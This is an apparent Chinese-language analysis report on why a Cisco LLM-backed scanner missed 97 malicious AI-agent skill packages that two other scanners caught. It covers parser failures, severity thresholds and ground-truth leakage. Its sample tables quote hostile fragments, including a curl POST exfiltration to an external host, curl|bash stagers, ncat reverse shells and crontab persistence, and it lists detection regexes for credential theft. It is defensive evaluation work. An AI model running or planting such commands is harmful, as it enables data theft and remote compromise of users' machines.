# 分析报告：SS+Caterpillar 双检出而 Cisco 漏检的 97 个样本

> 生成时间：2026-08-17 ｜ 数据源：`/tmp/group_double_sc.txt` + `scanners/eval_results/raw/{cisco,skillspector,caterpillar}/<sample>.json` + `verdict_all.csv` + `generator/output/<sample>/_provenance.json`
> 判定口径：Cisco 检出 = `is_safe == False`；SS 检出 = `score > 0`；Cat 检出 = `n_findings > 0`（Cat raw 在 `data` 字段）

---

## 0. TL;DR

**Cisco 漏检这 97 个样本的根因分三类，且不是"LLM 没看出恶意"——**

| 根因 | 数量 | 占比 | 含义 |
|---|---|---|---|
| **B. LLM 分析管线技术失败**（`LLM_ANALYSIS_FAILED`） | 62 | 63.9% | LLM 调用返回空响应（47）或响应 JSON 解析失败（15）。**其中 15 个解析失败样本里，LLM 实际已经输出了 CRITICAL/HIGH 检出，但被解析器丢弃，最终判 safe。** |
| **C. 判定阈值设计缺陷**（LLM 成功但只给出 MEDIUM/LOW） | 24 | 24.7% | `is_safe` 仅在存在 CRITICAL/HIGH finding 时为 False；静态/LLM 检出（如 `DATA_EXFIL_NETWORK_REQUESTS`×66、`TOOL_ABUSE_UNDECLARED_NETWORK`×38、`LLM_DATA_EXFILTRATION`×14）全是 MEDIUM，**Cisco 检测到了信号却不上报为不安全**。 |
| **C1. LLM 判定失误**（0 finding） | 6 | 6.2% | LLM 成功、未产生任何 finding，直接判 SAFE。 |
| **A. 扫描无输出**（数据缺失） | 5 | 5.2% | CLI 崩溃/无输出，raw 文件仅 `{"error":"","is_safe":null}`。 |

**附带发现（方法学警告）**：gen 样本的 **Caterpillar 扫描输入包含 `_provenance.json`（ground-truth 文件）**——Cat 的 evidence 字段逐字命中 provenance 里的 seed_actions 文本；离线重跑对照实验证明：带 provenance → Cat 判 C/62（检出），去掉 → A/100（干净）。67 个 gen 样本中 8 个（12%）的 Cat 检出完全由 ground-truth 泄漏驱动，59 个（88%）去掉泄漏后仍被检出。**Cisco 的扫描输入不含 provenance**（其 `_copy_tree` 剔除单下划线前缀文件，0/67 个评估文本引用 seed 内容），因此 Cisco 的漏检是真实能力缺口，不是数据优势造成的。

---

## 1. 样本构成统计

### 1.1 wild / gen 比例

| 集合 | 数量 | 占比 |
|---|---|---|
| wild（真实样本，`wild-350/`） | 30 | 30.9% |
| gen（构造样本，`generator/output/`） | 67 | 69.1% |
| **合计** | **97** | 100% |

### 1.2 wild 样本按 B 标签（行为）

| B 标签 | 行为 | 数量 |
|---|---|---|
| B4 | Malware Delivery | 18 |
| B1 | Data Exfiltration | 5 |
| B2 | Credential Theft | 4 |
| B3 | Remote Code Execution | 2 |
| B5 | Persistence | 1 |
| **合计** | | **30** |

wild 样本高度集中在 B4（恶意载荷投递，60%），与本项目 wild-350 语料整体行为分布（B4 ≈ 86.6%）一致但略分散。

### 1.3 gen 样本按坐标（source/mechanism/target）

36 个不同坐标，top 分布：

| 坐标 | 数量 |
|---|---|
| source_agnostic/code_exec/resource_abuse | 4 |
| source_agnostic/obfuscation/info_theft | 4 |
| external_content/code_exec/target_agnostic | 3 |
| external_content/dependency_manip/target_agnostic | 3 |
| supply_chain/instruction_manip/target_agnostic | 3 |
| supply_chain/mechanism_unknown/target_agnostic | 3 |
| supply_chain/obfuscation/defense_evasion | 3 |
| source_agnostic/privilege_abuse/resource_abuse | 3 |
| user_input/code_exec/target_agnostic | 3 |
| 其余 27 个坐标（各 1-2 个） | 38 |
| **合计** | **67** |

mechanism 覆盖 code_exec / dependency_manip / instruction_manip / obfuscation / privilege_abuse / state_corruption / mechanism_unknown / trigger_abuse / subagent_escalation / defense_evasion，无坐标偏科。

---

## 2. Cisco 漏检根因分类（全量 97）

对每个样本读取 `raw/cisco/<sample>.json`，按以下规则分类：

- **A_no_output**：raw 文件为 `{"error": "", "is_safe": null}` 或无可解析内容 → 扫描本身失败。
- **B1_empty_response**：findings 含 `LLM_ANALYSIS_FAILED` 且 error 为 `Empty response from LLM` → LLM 调用返回空。
- **B2_parse_fail**：findings 含 `LLM_ANALYSIS_FAILED` 且 error 含 `Could not parse JSON` → LLM 有输出但 JSON 解析失败。
- **C1_judged_safe_zero**：无 LLM 失败、`findings_count == 0` → LLM 正常判安全。
- **C2_below_threshold**：无 LLM 失败、有 finding 但 `max_severity ∈ {SAFE, INFO, LOW, MEDIUM}` → 检出存在但低于 `is_safe` 阈值。

### 2.1 全量分类结果

| 类别 | 全量 | wild | gen |
|---|---|---|---|
| B1_empty_response | 47 (48.5%) | 12 | 35 |
| C2_below_threshold | 24 (24.7%) | 5 | 19 |
| B2_parse_fail | 15 (15.5%) | 9 | 6 |
| C1_judged_safe_zero | 6 (6.2%) | 0 | 6 |
| A_no_output | 5 (5.2%) | 4 | 1 |
| **合计** | **97** | **30** | **67** |

### 2.2 核心机制：`is_safe` 的阈值设计

`skill_scanner/core/models.py:224`：

```python
@property
def is_safe(self) -> bool:
    return not any(f.severity in (Severity.CRITICAL, Severity.HIGH) for f in self.findings)
```

**只有 CRITICAL/HIGH finding 才会让 `is_safe=False`。** 对 92 个 `is_safe=True` 样本统计其 finding severity：

| Severity | finding 数 |
|---|---|
| MEDIUM | 185 |
| INFO | 37 |
| LOW | 33 |

Top 规则（全部 ≤ MEDIUM，全部被吞）：

| rule_id | severity | 次数 | 说明 |
|---|---|---|---|
| DATA_EXFIL_NETWORK_REQUESTS | MEDIUM | 66 | 静态检出"出站网络请求原语" |
| TOOL_ABUSE_UNDECLARED_NETWORK | MEDIUM | 38 | 静态检出未声明网络使用 |
| MANIFEST_MISSING_LICENSE | INFO | 37 | 无 license（噪声） |
| SUPPLY_CHAIN_UNPINNED_DEPENDENCY | MEDIUM | 26 | 依赖未锁版本 |
| LLM_DATA_EXFILTRATION | MEDIUM | 14 | LLM 检出数据外泄 |
| LLM_SUPPLY_CHAIN_ATTACK | LOW/MEDIUM | 18 | LLM 检出供应链攻击 |

**即：Cisco 的静态分析器和 LLM 在这些样本上已经检测到与 SS/Cat 相同的信号（网络外泄、未声明网络、供应链风险），但全部定级 MEDIUM/LOW，未达到 CRITICAL/HIGH，`is_safe` 仍为 True。**

### 2.3 解析失败是"检测成功但被丢弃"

15 个 B2_parse_fail 的 LLM 原始响应（记录在 finding metadata 的 error 字段）明确包含检出，例如：

- `clawdhub-3jv6c6gijf`：`severity: CRITICAL, aitech: AITech-9.1, title: "Malicious Remote Code Execution Command in SKILL.md"`
- `nano-banana-pro-8ap3x7`：`CRITICAL, AITech-9.1, "Malicious remote code execution stager in SKILL.md"`
- `whatsapp`：`CRITICAL, AITech-9.1, "Remote code execution payload in SKILL.md setup instructions"`
- `youtube-summarize-ppfxa`：`CRITICAL, AITech-9.3, "Untrusted third-party binary required by skill"`
- `skill-obfuscation-defense_evasion-bca57f71e2`：`HIGH, AITech-8.2, "Hidden telemetry exfiltration to external server"`

这些响应以 `{"findings": [{...}]}` 开头，但 `ResponseParser.parse()` 全部失败（直接 `json.loads` 失败、markdown 围栏提取失败、花括号配平失败），最终整个响应被丢弃，只留下一个 INFO 级 `LLM_ANALYSIS_FAILED` finding。

### 2.4 空响应是最大单类（47 个）

`llm_response_parser.py:49`：`if not response_content or not response_content.strip(): raise ValueError("Empty response from LLM")`。47 个样本 LLM 返回了空 content。SKILL.md 中位数仅 2143 字节（min 1315 / max 14636），**不是上下文预算超限**（无 `LLM_CONTEXT_BUDGET_EXCEEDED` finding），而是 DeepSeek 后端返回空——推测是请求层面的失败（超时/限流/模型端异常），属于评测环境技术故障，而非检测能力。

### 2.5 数据缺失（5 个）

raw 文件只有 `{"error": "", "is_safe": null}`，CLI 无任何输出。4 个 wild + 1 个 gen：

- `clawhub-assassin-1234-clawtrial__v1.0.9`、`clawhub-portisclawbot-setup-wizard__v1.1.0`、`clawhub-yuan-xuan-the-origin-huan-ai-soul-thought-protocol__v3.0.9`、`openclaw-skills-skills-fobonacci404-evilcalc-skill-md__1769769488`（wild）
- `skill-dependency_manip-target_agnostic-8dea452f35`（gen）

---

## 3. 抽查明细（24 个样本，覆盖全部 5 类根因 × 坐标/B 标签多样性）

抽样策略：5 类 Cisco 根因 × (wild B1-B5 全标签 + gen 各机制坐标)，共 24 个。

### 3.1 wild 样本抽查（11 个）

| 样本 | B | Cisco 漏因 | Cisco 实际输出 | SS 信号 | Cat 信号 |
|---|---|---|---|---|---|
| clawhub-assassin-1234-clawtrial__v1.0.9 | B1 | **A_no_output**（CLI 无输出） | 无 | score=8, RP1 (rug-pull) | A/92, 1 finding（npm install 供应链） |
| clawhub-portisclawbot-setup-wizard__v1.1.0 | B1 | **A_no_output** | 无 | score=7 | B/77, 2（`curl -s -X POST https://leqoshhsoufr.sealosbja.site` 数据外泄 + `>/dev/null` 输出抑制） |
| clawhub-yuan-xuan-…thought-protocol__v3.0.9 | B5 | **A_no_output** | 无 | score=43, PE2×7+RA2+TM1（sudo/提权/工具滥用） | C/69, 3（crontab 持久化 + chmod +x） |
| openclaw-skills-…evilcalc-skill-md__1769769488 | B3 | **A_no_output** | 无 | score=100, SDI-1/2+SQP-2+SSD-1 | A/92, 1（`>/dev/null`） |
| solflare | B2 | **B1_empty**（LLM 空响应） | INFO, 仅 MANIFEST_MISSING_LICENSE | score=23 | D/47, 3（Ledger 钱包访问 + curl POST + cargo install） |
| google-workspace-2z5dp | B4 | **B1_empty** | INFO | score=26, SDI-1+PE3×3（凭据文件） | A/92, 1（pip install） |
| clawdhub-3jv6c6gijf | B4 | **B2_parse_fail**（LLM 输出 CRITICAL AITech-9.1 但被丢弃） | INFO, LLM_ANALYSIS_FAILED | score=49, SQP-2 | A/92, 1（base64 -D 编码执行） |
| whatsapp | B4 | **B2_parse_fail**（LLM 输出 CRITICAL 被丢弃） | INFO, LLM_ANALYSIS_FAILED | score=99, SQP-2+SSD-2 | A/92, 1（base64 -D） |
| phantom-q8ark | B4 | **B2_parse_fail**（LLM 输出 CRITICAL AITech-9.3 被丢弃） | INFO | score=72, SQP-2+SSD-1 | C/70, 1（Ledger） |
| metamask | B2 | **C2_below**（LLM 检出供应链攻击但 MEDIUM） | MEDIUM, LLM_SUPPLY_CHAIN_ATTACK | score=42, SQP-2+SC2 | D/40, 2（`curl -L https://foundry.paradigm.xyz \| bash` 远程执行 + metamask） |
| gas-tracker | B1 | **C2_below**（LLM 检出但 MEDIUM） | MEDIUM, LLM_SUPPLY_CHAIN_ATTACK+LLM_RESOURCE_ABUSE | score=40, SQP-2+E1×11（外发 URL） | C/70, 1（`curl … \| bash`） |

> 注：wild 样本 SKILL.md 内含明显恶意文本（base64 载荷、`curl|bash`、外部 POST 端点、crontab 持久化、Ledger/私钥引用），SS/Cat 均能直接命中；Cisco 要么扫描失败、要么 LLM 被空响应/解析失败吞掉、要么定级 MEDIUM。

### 3.2 gen 样本抽查（13 个）

| 样本 | 坐标 | Cisco 漏因 | Cisco 实际输出 | SS 信号 | Cat 信号 |
|---|---|---|---|---|---|
| skill-code_exec-info_theft-252b70ffcf | supply_chain/code_exec/info_theft | **C1_judged_safe**（0 finding，LLM 判 SAFE） | 0 finding，LLM 评估"benign git utility… never accesses the network" | score=2 | C/62, 2（`curl -s <domain>:<port>/collect \| bash` + base64）※ 泄漏驱动 |
| skill-code_exec-target_agnostic-6b3b4f0157 | user_input/code_exec/target_agnostic | **C1_judged_safe** | 0 finding | score=18, LP3+AST4 | A/92, 1（chmod +x） |
| skill-obfuscation-target_agnostic-6c05f97972 | supply_chain/obfuscation/target_agnostic | **C1_judged_safe** | 0 finding | score=27, LP3+AST4×2+SDI-4 | F/32, 3（curl\|sh + ncat 反连 + base64） |
| skill-state_corruption-defense_evasion-d36503c61d | source_agnostic/state_corruption/defense_evasion | **C1_judged_safe** | 0 finding | score=7, LP3 | A/92, 1（chmod +x） |
| skill-dependency_manip-info_theft-de0edcd016 | supply_chain/dependency_manip/info_theft | **B1_empty** | MEDIUM, TOOL_ABUSE_UNDECLARED_NETWORK | score=70, LP3+SDI-1×3+AST4×2+SDI-4 | D/47, 3（curl\|sh + postinstall hook + base64）※ 部分泄漏驱动 |
| skill-instruction_manip-resource_abuse-7328c4aaaf | source_agnostic/instruction_manip/resource_abuse | **B1_empty** | INFO | score=100, LP3+PE3×4+AST4×2+EA4+TM1×4 | A/92, 1（pip install） |
| skill-subagent_escalation-target_agnostic-5fb8c872ae | source_agnostic/subagent_escalation/target_agnostic | **B1_empty** | INFO | score=34, LP3+PE3+E2 | B/85, 1（dotenv 环境密钥） |
| skill-code_exec-resource_abuse-714fd2e843 | source_agnostic/code_exec/resource_abuse | **B2_parse_fail**（LLM 输出 HIGH AITech-9.1 被丢弃） | INFO | score=11, LP3+AST7 | A/92, 1（pip install） |
| skill-obfuscation-defense_evasion-bca57f71e2 | supply_chain/obfuscation/defense_evasion | **B2_parse_fail**（LLM 输出 HIGH AITech-8.2 被丢弃） | MEDIUM, TOOL_ABUSE+DATA_EXFIL×2 | score=8, LP3 | D/54, 3（curl\|sh + base64 + pip）※ 部分泄漏驱动 |
| skill-privilege_abuse-financial_theft-0686615fc5 | source_agnostic/privilege_abuse/financial_theft | **B2_parse_fail**（LLM 输出 MEDIUM 被丢弃） | INFO | score=15, PE3×5 | D/54, 4（dotenv 密钥 + .bashrc 持久化 + chmod +x） |
| skill-trigger_abuse-target_agnostic-05e4560a65 | supply_chain/trigger_abuse/target_agnostic | **C2_below**（LLM 检出 SKILL_DISCOVERY_ABUSE 但 MEDIUM） | MEDIUM, LLM_SKILL_DISCOVERY_ABUSE + SUPPLY_CHAIN_UNPINNED×4 | score=100, SQP-1/2+AST4×2+TT3+SDI-2 | D/54, 3（curl\|sh + base64 + pip） |
| skill-mechanism_unknown-target_agnostic-0df543b0fe | supply_chain/mechanism_unknown/target_agnostic | **C2_below**（检出但全 MEDIUM） | MEDIUM, LLM_UNAUTHORIZED_TOOL_USE + ALLOWED_TOOLS 违例×4 | score=27, LP1 | F/32, 3（curl\|sh + ncat + base64） |
| skill-dependency_manip-target_agnostic-8dea452f35 | supply_chain/dependency_manip/target_agnostic | **A_no_output** | 无输出 | score=26, SQP-2+AST4+AST3 | F/31, 5（curl\|sh + rm -rf ~ + base64） |

> gen 样本的恶意载体多数藏在 `scripts/`、`*.py` 模块或安装命令中（curl\|sh、base64、postinstall hook、dotenv 密钥、ncat 反连、crontab），SKILL.md 正文常伪装成正常工具。SS 靠 AST 静态规则（AST4 subprocess、PE3 凭据文件、LP3 无权限声明）+ 语义 LLM（SDI/SQP/SSD）命中；Cat 靠正则命中字面证据。

---

## 4. Cisco 漏检根因归纳

### 4.1 三类根因（含机制证据）

**① 技术失败占主导：LLM_ANALYSIS_FAILED = 62/97 (63.9%)**
- 空响应 47 个：DeepSeek 返回空 content，`ResponseParser` 直接抛 `Empty response from LLM`。SKILL.md 体量小（中位 2.1KB），排除预算截断；推测为后端请求失败（超时/限流）。
- 解析失败 15 个：LLM 实际已输出 CRITICAL/HIGH finding（AITech-9.1/8.2/9.3 等），但 `json.loads` + markdown 围栏 + 花括号配平三条路径全部失败 → 整包丢弃。**这是"检测到了却没用上"的最强证据。**
- 技术失败后仅剩静态分析；而静态检出又全部 ≤ MEDIUM（见 4.2），于是 `is_safe=True`。

**② 阈值设计缺陷：C2 = 24/97 (24.7%)**
- `is_safe` 只看 CRITICAL/HIGH。静态规则 `DATA_EXFIL_NETWORK_REQUESTS`（66 次）与 LLM 规则 `LLM_DATA_EXFILTRATION`/`LLM_SUPPLY_CHAIN_ATTACK` 在 24 个样本上命中，但 severity 全为 MEDIUM/LOW。
- 后果：Cisco "检测到异常但报告安全"——与 SS/Cat 的检出信号重叠度最高的一类，也是"漏检"中最不可辩护的一类。

**③ 判定失误与数据缺失：6 + 5 = 11/97 (11.3%)**
- C1：LLM 正常完成、0 finding。典型如 252b70ffcf（git-commit-helper 伪装，恶意代码藏在 scripts/ 未扩展名脚本，Cisco 的 `get_file_type` 按扩展名分类把无扩展名文件标为 `other`，既不进 LLM prompt 也不进静态规则）。注：该样本当前磁盘版本为弱化版，Cat 的检出证据来自 provenance 泄漏（见 §5）。
- A：CLI 无任何输出（5 个），raw 仅 `{"error":"","is_safe":null}`。

### 4.2 Cisco 漏检样本的共性

1. **指令型/代码型恶意都覆盖，但全部卡在 MEDIUM**——这是最强共性：92 个 safe 样本的 255 个非 LLM 失败 finding 中，185 个 MEDIUM、37 个 INFO、33 个 LOW，**0 个 CRITICAL/HIGH**。
2. **载荷位置**：wild 的 base64/curl|bash 直接写在 SKILL.md；gen 的载荷在 scripts/、模块、安装 hook 中。Cisco 静态分析器能看到（file_path 指向脚本），但定级不够。
3. **LLM 后端不稳定**：空响应 47 个横跨 wild/gen，与样本内容无关，纯技术故障。
4. **伪装有效**：C1 的 6 个样本均为"正常功能包裹恶意行为"，LLM 被 frontmatter 描述带偏（"never accesses the network"）。

### 4.3 SS 与 Cat 各自用什么信号抓到的

**SkillSpector（多引擎，score>0 即检出）**
- 静态 AST 规则：AST3 `__import__` / AST4 subprocess / AST7 getattr 动态调用；E1/E2 外发 URL、环境变量批量访问；PE2 sudo / PE3 凭据文件；SC2 远程下载执行；LP1/LP3 最小权限缺失；TM1 工具滥用；RP1 rug-pull；EA4 资源无界。
- 语义 LLM 规则：SDI-1~4（描述-行为不一致、越权、scope creep、意图-代码背离）；SQP-1~3（模糊触发、缺用户警告、自然语言策略违例）；SSD-1~4（语义注入、换说法攻击、自然语言外泄、渐进欺骗）。
- **SS 抓到 Cisco 漏的关键**：不看 severity 阈值（score 连续值），且有 AST+LLM 双通道冗余——LLM 空响应时静态规则仍给分。

**Caterpillar（离线正则，n_findings>0 即检出）**
- 纯正则规则集：`curl.*|sh|bash`（critical 远程执行）、`base64 -d|atob|eval|exec`（混淆）、`/etc/passwd|shadow`、`crontab|.bashrc`（持久化）、`nc -l|ncat`（反连）、`chmod +x`、`pip/cargo/npm install`（供应链）、`dotenv|Ledger|seed phrase`（凭据/加密币）、`>/dev/null|--silent`（输出抑制）。
- **Cat 抓到 Cisco 漏的关键**：evidence 是正则命中的**字面文本**，直接产出可审计证据链；且对"危险字符串存在即告警"不设 severity 门槛。

---

## 5. 方法学警告：gen 样本的 Caterpillar 扫描存在 ground-truth 泄漏

### 5.1 证据链

1. Cat 的 evidence 字段是 `matches[0]`（正则命中的原文）。
2. 抽查 `skill-code_exec-info_theft-252b70ffcf`：Cat evidence = `curl -s <domain>:<port>/collect | bash` + `base64 -D`——该字符串**不在** SKILL.md/scripts 任何文件中，而**逐字出现在** `_provenance.json` 的 `seed_actions` 里。
3. 离线重跑对照实验（Caterpillar `--mode offline`）：
   - 输入含 `_provenance.json` → grade C/62，2 findings，evidence 与 raw 完全一致；
   - 去掉 `_provenance.json` → grade A/100，0 findings。
4. 全量检查 67 个 gen 样本：33 个（49%）的 Cat evidence 仅存在于 provenance（不在任何非元数据文件中）。

### 5.2 影响量化

| 指标 | 数量 |
|---|---|
| gen 样本总数 | 67 |
| 去掉 provenance 后 Cat 仍检出的 | 59 (88%) |
| 去掉 provenance 后 Cat 翻转干净的（**泄漏驱动**） | **8 (12%)** |

8 个泄漏驱动样本：252b70ffcf、392f75f6c9、de0edcd016、03d815de7c、af8edaf643、efc1e9abb5、25f8897e77、96b47b3928。

### 5.3 对结论的影响

- **Cisco 不受泄漏影响**：其 `_copy_tree` 明确剔除 `_`/`__` 前缀文件；0/67 个评估文本含 seed 内容；`is_safe` 判定与其输入无关。Cisco 漏检是真实缺口。
- **SS+Cat 双检出在 gen 子集上被高估约 12%**（8/67 的 Cat 侧完全靠泄漏）；**wild 子集（30 个）无 provenance，其双检出证据完全干净**，是"SS+Cat 检出、Cisco 漏"论断最硬的 30 个样本。
- 论文表述建议：双检出论证以 30 个 wild 样本为核心证据，gen 样本作为补充并注明泄漏影响。

### 5.4 附带数据质量备注

- `raw/skillspector/` 目录中部分 gen 样本文件与内容错位（batch-scan 产物写错文件名，如 `skill-code_exec-info_theft-252b70ffcf.json` 内容实为 clawdhub 扫描）。本报告 SS 数据以 `verdict_all.csv` + 对齐的 summary 文件（86/97）为准，未受错位影响。
- gen 样本在扫描后被重新生成过（provenance `generated_at` 晚于 cisco 扫描时间戳的本地时间），当前磁盘版本与扫描时版本可能存在差异；Cat 的 evidence 文本证明扫描时版本包含 payload 文本。

---

## 6. 结论与建议

1. **Cisco 的盲区本质是"检出→判定"链路的三处断点**：LLM 技术失败（63.9%）、severity 阈值吞掉 MEDIUM（24.7%）、LLM 判定失误/数据缺失（11.3%）。其中解析失败类（15 个）显示 **LLM 本身检测能力不弱**，问题在管线健壮性。
2. **最可修复、影响面最大的是阈值设计**：`DATA_EXFIL_NETWORK_REQUESTS` 等 MEDIUM 规则在 66 个样本上命中却不上报不安全。若 `is_safe` 改为"存在任何 MEDIUM+ 且规则为安全敏感类即警告/降级"，C2 类 24 个样本立即显形。
3. **解析器需要健壮化**：LLM 已输出合法语义的 findings JSON，`ResponseParser` 三条路径全失败 → 应增加"从错误响应中抢救 JSON 前缀"或"解析失败时按 LLM 原始文本降级展示"。
4. **空响应需要可观测性**：47 个空响应无法区分限流/超时/模型端异常，评测环境应记录原始 HTTP 状态与重试轨迹。
5. **方法学**：评测输入必须严格剔除 ground-truth 文件（`_provenance.json`）；建议对已污染结果重扫或至少在论文中披露 12% 的泄漏驱动比例。

---

## 附录 A：数据文件索引

- 样本清单：`/tmp/group_double_sc.txt`（97 行）
- 汇总数据集：`/tmp/double_sc_dataset.json`（全量 97 判定）
- 抽查明细：`/tmp/dossiers.json`（24 样本三引擎原始输出摘要）
- SKILL.md 恶意行提取：`/tmp/skill_hits.json`
- Cat 离线重跑结果：`/tmp/cat_clean_results.json`（67 gen 去 provenance 重扫）

---

## 附录：重扫后修正（2026-08-17）

> 133 个 Cisco 设施失败样本已重扫（rescan_failed.py）。修正要点：
> 1. **设施失败从"漏检"剔除**：重扫后 Cisco LLM 失败从 116 降到 17（残留全是 clawhub 无 frontmatter，Cisco 拒绝加载——输入格式问题，非检测能力）
> 2. **重扫恢复的检出**：wallet-tracker/deep-research/nano-banana-pro/coding-agent 等恢复为 CRITICAL（之前误判漏检）
> 3. **阈值放行单独标注**：80 个样本 is_safe=True 但有 MEDIUM 危险 finding（TOOL_ABUSE_UNDECLARED_NETWORK 58 / DATA_EXFIL_NETWORK_REQUESTS 51）——"检测到了但阈值吞掉"，非真漏检
> 4. **本报告涉及样本的重扫残留失败数**：见上文各表（Cisco 失败残留 = clawhub 无 frontmatter）
